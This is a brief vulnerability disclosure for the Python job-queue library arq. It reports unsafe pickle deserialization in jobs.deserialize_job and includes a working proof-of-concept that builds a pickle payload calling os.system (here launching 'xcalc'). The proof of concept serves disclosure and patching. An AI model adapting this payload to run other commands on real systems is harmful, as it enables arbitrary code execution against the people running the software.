# Description
arq is a fast job queuing and RPC in python with asyncio and redis. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install arq')
from arq import jobs
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
jobs.deserialize_job(dumps)
```
* `pip3 install arq`
* `python3 exploit.py`
